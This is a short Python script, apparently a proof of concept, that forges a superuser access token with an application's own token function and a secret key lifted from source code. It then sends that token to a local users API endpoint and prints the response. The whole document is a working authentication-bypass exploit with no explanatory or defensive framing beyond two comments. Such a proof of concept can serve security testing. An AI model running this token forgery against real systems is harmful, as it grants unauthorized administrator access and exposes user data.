import requests
from app.core import security
from datetime import timedelta

# 1. Forge a Superuser Token
# We use the same secret key from source code
access_token = security.create_access_token(
    data={"sub": "admin@mail.com", "role": "superuser"},
    expires_delta=timedelta(minutes=5)
)

print(f"Forged Token: {access_token[:20]}...")

# 2. Call the API
url = "http://127.0.0.1:8000/api/v1/users/"
headers = {"Authorization": f"Bearer {access_token}"}

try:
    response = requests.get(url, headers=headers)
    print(f"Status Code: {response.status_code}")
    print(f"Response: {response.text}")
except Exception as e:
    print(f"Request failed: {e}")
